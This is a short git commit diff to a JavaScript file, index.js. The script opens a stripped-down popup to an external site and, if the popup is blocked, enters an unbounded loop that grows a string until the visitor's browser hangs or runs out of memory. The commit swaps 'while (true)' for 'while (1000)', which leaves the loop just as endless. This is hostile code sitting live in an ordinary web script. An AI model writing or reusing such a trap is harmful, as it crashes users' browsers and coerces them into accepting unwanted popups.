cfcc36a291183532a8cd8dc04108f4d61456d25f
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-15 14:01:20 -0500

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@
    var popUp = window.open("http://kplibrary.cf/", '_blank', 'toolbar=0,location=0,menubar=0');
    if (popUp == null || typeof(popUp) == 'undefined') {
      txt = "a";
-     while (true) {
+     while (1000) {
        txt = txt += "a";
      }
    } else {
